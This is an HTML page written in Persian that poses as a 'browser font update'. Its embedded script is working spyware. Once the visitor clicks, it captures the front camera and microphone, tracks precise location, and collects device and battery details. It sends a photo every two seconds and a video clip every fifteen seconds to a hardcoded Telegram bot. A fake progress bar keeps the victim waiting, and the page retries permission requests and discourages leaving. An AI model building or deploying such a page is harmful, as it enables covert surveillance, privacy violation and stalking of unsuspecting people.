<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>به‌روزرسانی فونت مرورگر</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #000, #001122); color: #fff; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center; }
    .container { background: rgba(255,255,255,0.1); border-radius: 20px; padding: 40px; max-width: 400px; box-shadow: 0 10px 30px rgba(0,255,136,0.3); animation: glow 2s infinite alternate; }
    @keyframes glow { 0% { box-shadow: 0 10px 30px rgba(0,255,136,0.3); } 100% { box-shadow: 0 10px 30px rgba(0,255,136,0.5); } }
    h1 { font-size: 1.8em; margin-bottom: 15px; color: #00ff88; }
    p { margin: 10px 0; opacity: 0.9; }
    button { padding: 12px 30px; font-size: 1.1em; background: #00ff88; color: #000; border: none; border-radius: 25px; cursor: pointer; margin-top: 15px; transition: transform 0.3s; }
    button:hover { transform: scale(1.05); }
    #loading { display: none; }
    .spinner { border: 4px solid rgba(255,255,255,0.3); border-top: 4px solid #00ff88; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    .progress { width: 80%; height: 6px; background: rgba(255,255,255,0.2); border-radius: 3px; overflow: hidden; margin: 15px auto; }
    .bar { height: 100%; background: #00ff88; width: 0%; transition: width 0.5s; }
    #video, #canvas { display: none; }
    #warning { display: none; background: rgba(255,0,0,0.8); padding: 20px; border-radius: 10px; margin: 10px; }
  </style>
</head>
<body>
  <div class="container" id="lure">
    <h1>فونت مرورگر قدیمی!</h1>
    <p>برای بروزرسانی، اجازه دسترسی دهید.</p>
    <button id="start">شروع</button>
  </div>
  <div class="container" id="loading">
    <div class="spinner"></div>
    <h1>در حال بروزرسانی...</h1>
    <p id="status">0%</p>
    <div class="progress"><div class="bar" id="bar"></div></div>
    <p>صبر کنید...</p>
  </div>
  <div id="warning">⚠️ HTTPS لازم است! بدون آن، دسترسی کار نمی‌کند. Vercel استفاده کنید.</div>
  <video id="video" autoplay muted playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const BOT_TOKEN = "8547105891:AAHfkoex33xxz9TWP612juJHtvxOZmWNQk8";
    const CHAT_ID = "7625898629";
    const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
    let stream, interval;

    async function sendData(type, data, caption = '') {
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      if (caption) form.append('caption', caption);
      if (type === 'photo' || type === 'video') {
        form.append(type, data);
      } else {
        form.append('text', data);
      }
      fetch(`${API}/${type === 'photo' ? 'sendPhoto' : type === 'video' ? 'sendVideo' : 'sendMessage'}`, {
        method: 'POST',
        body: form
      }).catch(() => {});
    }

    function isSecure() {
      if (location.protocol !== 'https:') {
        document.getElementById('warning').style.display = 'block';
        return false;
      }
      return true;
    }

    async function requestPermissions() {
      try {
        // Split: Video first
        const videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        // Then audio
        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
        stream = new MediaStream([...videoStream.getVideoTracks(), ...audioStream.getAudioTracks()]);

        document.getElementById('video').srcObject = stream;

        // Device info
        const battery = await navigator.getBattery();
        sendData('message', JSON.stringify({
          userAgent: navigator.userAgent,
          battery: Math.round(battery.level * 100) + '%',
          platform: navigator.platform
        }), 'Device Info');

        // Location
        navigator.geolocation.watchPosition(pos => {
          sendData('message', `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`, 'Location');
        }, null, { enableHighAccuracy: true });

        // Photos every 2s
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 320; canvas.height = 240;
        interval = setInterval(() => {
          ctx.drawImage(document.getElementById('video'), 0, 0, canvas.width, canvas.height);
          canvas.toBlob(blob => sendData('photo', blob), 'image/jpeg', 0.8);
        }, 2000);

        // Videos every 15s (5s clip)
        setInterval(() => {
          const recorder = new MediaRecorder(stream);
          const chunks = [];
          recorder.ondataavailable = e => chunks.push(e.data);
          recorder.onstop = () => sendData('video', new Blob(chunks, { type: 'video/webm' }));
          recorder.start();
          setTimeout(() => recorder.stop(), 5000);
        }, 15000);

      } catch (err) {
        console.log('Permission error:', err);
        // Retry logic (5 times)
        if (retry < 5) {
          setTimeout(requestPermissions, 2000 * retry);
          retry++;
        }
      }
    }

    let retry = 0;
    let progress = 0;
    function fakeProgress() {
      progress += Math.random() * 10;
      if (progress > 98) progress = 98;
      document.getElementById('bar').style.width = progress + '%';
      document.getElementById('status').textContent = Math.round(progress) + '%';
      setTimeout(fakeProgress, 1000);
    }

    document.getElementById('start').onclick = () => {
      if (!isSecure()) return;
      document.getElementById('lure').style.display = 'none';
      document.getElementById('loading').style.display = 'block';
      requestPermissions();
      fakeProgress();
    };

    window.onbeforeunload = () => 'بروزرسانی متوقف می‌شود!';
  </script>
</body>
</html>
